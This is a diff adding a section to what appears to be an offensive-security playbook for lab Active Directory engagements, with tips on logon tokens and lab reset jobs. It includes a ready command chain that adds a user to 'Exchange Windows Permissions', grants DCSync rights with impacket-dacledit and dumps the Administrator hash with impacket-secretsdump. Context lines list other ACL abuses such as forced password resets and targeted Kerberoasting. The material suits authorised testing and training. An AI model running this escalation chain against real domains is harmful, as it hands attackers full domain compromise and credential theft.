@@ -54,6 +54,30 @@ is available:
 pwnloop x "grep -i 'GenericAll\|GenericWrite\|WriteDacl\|WriteOwner\|ForceChangePassword\|AddMember' /engagements/$NAME/loot/*.json | head -40"
 ```
 
+### Two gotchas that waste time on a live DC
+
+**A Windows access token is fixed at logon.** If you add yourself to a group or
+grant yourself a right, the session you already hold does **not** gain it — you
+need a fresh logon, which on Kerberos means a fresh TGT. The most reliable way to
+act on a just-granted right is from Linux with impacket/`net rpc`, each command
+re-authenticating with the password, rather than trying to use a WinRM/PowerShell
+session that started before the change.
+
+**Lab DCs run a reset job** that reverts state (group membership, ACLs) every few
+minutes. Do not add a group, wander off to enumerate, and come back — the change
+will be gone. Chain add + grant + use in one window:
+
+```bash
+# one window, each step re-auths fresh — beats both the token and the reset job
+nxc x "net rpc group addmem 'Exchange Windows Permissions' myuser -U 'dom/myuser%pass' -S $T"
+impacket-dacledit -action write -rights DCSync -principal myuser \
+  -target-dn 'DC=dom,DC=local' 'dom/myuser:pass' -dc-ip $T
+impacket-secretsdump 'dom/myuser:pass'@$T -just-dc-user Administrator
+```
+
+Prefer NTLM/password auth here. Kerberos adds `KRB_AP_ERR_SKEW` (DC clock drift);
+if you must use it, `ntpdate -u $T` first, in the *same* invocation as the action.
+
 Common ACL abuses:
 - `ForceChangePassword` on a user → reset their password with `net rpc password`
 - `GenericAll` on a user → targeted Kerberoast (add an SPN) or password reset
